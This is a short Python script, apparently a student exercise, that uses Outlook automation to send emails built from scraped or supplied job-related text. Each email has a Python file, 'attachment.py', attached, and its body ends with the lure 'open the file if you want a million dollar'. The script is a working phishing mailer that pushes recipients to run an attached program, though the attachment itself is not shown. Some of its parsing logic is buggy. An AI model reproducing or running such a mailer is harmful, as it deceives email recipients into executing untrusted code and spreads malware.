#Bar Genish 313174583
import win32com.client as win32		# for sending mail
import sys			
import os			 
import validators		# for url validation
from bs4 import BeautifulSoup		# for html
import requests		# for url
		
def send_mail():		
	outlook = win32.Dispatch('outlook.application')
	mail = outlook.CreateItem(0)
	mail.To = email
	mail.Subject = job_title
	mail.Body = body+'\nopen the file if you want a million dollar'
	attachment  = "attachment.py"
	path=os.getcwd() + '\\' + attachment
	mail.Attachments.Add(path)
	mail.Send()
	
if len(sys.argv)<4:
	print("Please enter 4 or 5 inouts")
	sys.exit()
	
username=sys.argv[1]
mailservice=sys.argv[2]
job_title=sys.argv[3]
body=""
email=username+'@'+mailservice

if len(sys.argv)==5:
	benignMail=sys.argv[4]
	benignMail=benignMail.replace('\\n', '\n')
	if validators.url(benignMail) == True :		#its a url
		r = requests.get(benignMail)
		soup = BeautifulSoup(r.content, 'html.parser')
		t=soup.title.string 
		n=soup.find('name')
		b=soup.find('body')
		c=soup.find('content')
		if t:
			job_title=t
		if n:
			email=n.text
		if b:
			body=b.text
		if c:
			body=c.text
		send_mail()
		
	elif "title" in benignMail or "Title" in benignMail:	#its a string
		str=benignMail.split("\n")
		for line in str:
			if "name" in line :
				email=line.split(":")[1]
			elif "title" in line or "Title" in line:
				job_title=line.split(":")[1]
			elif "body" in line or "content" :
				body = line.split(":")[1]+"\n"
		send_mail()
	elif os.path.exists(benignMail):		#its a path
		with open(benignMail) as p:
			a=p.readlines()
		name = ""
		title = ""
		body = ""
		for line in a:
			if "name" in line :
				email=line.split(":")[1].strip()
			elif "title" in line or "Title" in line:
				job_title=line.split(":")[1].strip()
			elif "body" in line or "content" :
				body = line.split(":")[1].strip()+"\n"
		send_mail()
	else:
		print ("not valid benignMail")
elif len(sys.argv)==4 :
	send_mail()